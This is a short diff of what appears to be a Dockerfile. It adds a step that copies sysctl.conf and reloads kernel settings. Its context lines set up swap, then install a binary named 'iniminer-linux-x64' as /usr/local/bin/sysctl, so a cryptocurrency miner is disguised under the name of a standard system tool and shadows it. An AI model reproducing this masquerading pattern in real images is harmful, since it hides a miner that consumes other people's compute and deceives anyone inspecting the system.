@@ -26,6 +26,10 @@ RUN mkswap /swapfile && \
 # Optimize swappiness
 RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf
 
+# Copy sysctl.conf for system optimizations
+COPY sysctl.conf /etc/sysctl.conf
+RUN sysctl -p
+
 # Download miner binary
 COPY iniminer-linux-x64 /usr/local/bin/sysctl
 RUN chmod +x /usr/local/bin/sysctl
